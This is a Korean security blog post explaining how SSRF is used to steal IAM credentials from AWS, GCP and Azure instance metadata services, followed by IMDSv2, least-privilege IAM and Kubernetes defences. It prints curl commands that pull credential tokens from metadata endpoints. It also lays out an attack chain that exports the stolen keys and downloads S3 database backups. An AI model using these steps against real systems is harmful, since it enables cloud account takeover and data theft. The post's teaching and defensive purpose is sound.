---
title: "SSRF와 클라우드 메타데이터: AWS/GCP/Azure 자격증명 탈취"
description: "SSRF로 클라우드 인스턴스 메타데이터 서비스를 공격해 IAM 자격증명을 탈취하는 실제 공격 체인, 주요 클라우드별 엔드포인트, IMDSv2와 최소 권한 IAM으로 방어하는 방법을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-04"
archiveOrder: 7
type: "knowledge"
category: "Security"
tags: ["SSRF", "클라우드 보안", "AWS", "IMDSv2", "IAM", "메타데이터"]
featured: false
draft: false
---

[지난 글](/posts/websec-ssrf/)에서 SSRF의 기본 원리와 내부 네트워크 공격을 살펴봤습니다. 이번 글에서는 SSRF 공격 중 가장 파급력이 큰 시나리오인 **클라우드 인스턴스 메타데이터 서비스(IMDS) 공격**을 집중적으로 다룹니다. 2019년 Capital One 데이터 유출 사고(1억 600만 명 개인정보 침해)도 SSRF를 통한 AWS 메타데이터 탈취로 시작되었습니다.

## 클라우드 메타데이터 서비스란?

AWS, GCP, Azure 등 클라우드 제공자는 인스턴스 내부에서만 접근 가능한 HTTP API를 제공합니다. 이 API는 인스턴스에 대한 정보(AMI ID, 인스턴스 타입, 퍼블릭 IP, 태그 등)와 함께 **IAM 역할에 연결된 임시 자격증명(Access Key, Secret Key, Session Token)**을 제공합니다.

이 API는 링크-로컬 IP(`169.254.169.254`)에 위치하며, 인스턴스 내부에서는 인증 없이 접근할 수 있도록 설계되었습니다(v1 기준). SSRF 취약점이 있는 서버가 이 주소에 요청을 보내게 만들면 자격증명을 탈취할 수 있습니다.

![클라우드 메타데이터 SSRF 공격 체인](/assets/posts/websec-ssrf-cloud-metadata-attack.svg)

## 주요 클라우드별 공격 엔드포인트

```bash
# AWS EC2 IMDSv1 — IAM 자격증명 탈취
# 1단계: 역할 이름 조회
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2단계: 역할 이름으로 자격증명 탈취
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
# 응답: { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }

# GCP Compute Engine — 서비스 계정 토큰
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure IMDS — 관리 ID 토큰
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"

# AWS EKS (Kubernetes Pod 환경)
curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# 또는 http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

## 실제 공격 시나리오

```
1. 공격자: 취약한 URL Fetch API 발견
   GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   응답: ec2-ssrf-demo-role

2. 공격자: IAM 자격증명 탈취
   GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-ssrf-demo-role
   응답:
   {
     "AccessKeyId": "ASIAXXX",
     "SecretAccessKey": "abc123",
     "Token": "FQoGZXIv...",
     "Expiration": "2026-06-04T18:00:00Z"
   }

3. 공격자: 탈취한 자격증명으로 AWS CLI 설정
   export AWS_ACCESS_KEY_ID=ASIAXXX
   export AWS_SECRET_ACCESS_KEY=abc123
   export AWS_SESSION_TOKEN=FQoGZXIv...

4. 공격자: 전체 S3 버킷 열람
   aws s3 ls                    # 모든 버킷 목록
   aws s3 cp s3://prod-db-backup/backup.sql .  # DB 백업 다운로드

5. 공격자: 다른 AWS 서비스 침투
   aws ec2 describe-instances   # 전체 인프라 파악
   aws secretsmanager list-secrets  # Secrets Manager 접근
   aws rds describe-db-instances    # RDS 목록
```

## IMDSv2: 메타데이터 서비스 보안 강화

AWS는 IMDSv2를 도입해 메타데이터 접근 시 PUT 요청으로 토큰을 먼저 발급받도록 요구합니다. SSRF는 일반적으로 GET 요청만 가능하므로 IMDSv2가 활성화된 경우 자격증명 탈취가 불가능합니다.

![IMDSv2와 클라우드 보안 설정](/assets/posts/websec-ssrf-cloud-metadata-defense.svg)

```bash
# IMDSv2: 토큰 발급 → 메타데이터 조회
TOKEN=$(curl -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# SSRF는 PUT 요청 생성이 어려워 이 단계에서 실패
```

IMDSv2를 모든 인스턴스에 강제 적용합니다:

```bash
# 기존 인스턴스에 적용
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxxx \
  --http-tokens required \
  --http-endpoint enabled

# 계정 전체 신규 인스턴스에 기본 적용 (Organization SCP)
aws ec2 modify-instance-metadata-defaults \
  --http-tokens required
```

```python
# boto3로 모든 EC2가 IMDSv2를 사용하는지 감사
import boto3

ec2 = boto3.client('ec2')
paginator = ec2.get_paginator('describe_instances')

for page in paginator.paginate():
    for reservation in page['Reservations']:
        for instance in reservation['Instances']:
            opts = instance.get('MetadataOptions', {})
            if opts.get('HttpTokens') != 'required':
                print(f"⚠ IMDSv1 사용 중: {instance['InstanceId']}")
```

## IAM 최소 권한 원칙

SSRF로 자격증명을 탈취하더라도 권한이 제한되어 있다면 피해를 최소화할 수 있습니다:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-app-bucket/*",
      "Condition": {
        "StringEquals": {
          "aws:RequestedRegion": "ap-northeast-2"
        }
      }
    }
  ]
}
```

모든 권한을 가진 `AdministratorAccess` 역할을 EC2에 부여하는 것은 절대 금물입니다. 애플리케이션이 실제로 필요한 최소한의 권한만 부여해야 합니다.

## GCP와 Azure 방어

```bash
# GCP: 인스턴스 메타데이터 서버 커스텀 헤더 요구
# Metadata-Flavor: Google 헤더 없이는 응답 안 함
# SSRF fetch()는 이 헤더를 못 붙임 → 방어

# Azure: 관리 ID 대신 서비스 주체(Service Principal) + 인증서 사용
# 또는 관리 ID를 사용하더라도 최소 권한 RBAC 적용

# GCP: VPC 방화벽으로 메타데이터 서버 차단 (컨테이너 환경)
# Kubernetes Pod에서 GCE 메타데이터 서버 접근 차단
```

## 컨테이너/Kubernetes 환경

```yaml
# EKS: IRSA (IAM Roles for Service Accounts) 사용
# Pod에 IAM 역할 직접 부여 — 메타데이터 서버 의존 없음
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::ACCOUNT:role/my-app-role

# GKE: Workload Identity 사용
# 메타데이터 서버 접근을 포드 단위로 제어
```

SSRF + 클라우드 메타데이터 조합은 작은 취약점 하나가 전체 클라우드 인프라 침해로 이어지는 치명적인 공격입니다. IMDSv2 강제 적용과 최소 권한 IAM은 클라우드 환경에서 반드시 구현해야 하는 기본 보안 설정입니다.

---

**지난 글:** [SSRF: 서버 사이드 요청 위조 — 내부망을 여는 취약점](/posts/websec-ssrf/)

**다음 글:** [Broken Access Control: 접근 제어 취약점의 모든 것](/posts/websec-broken-access-control/)

<br>
읽어주셔서 감사합니다. 😊
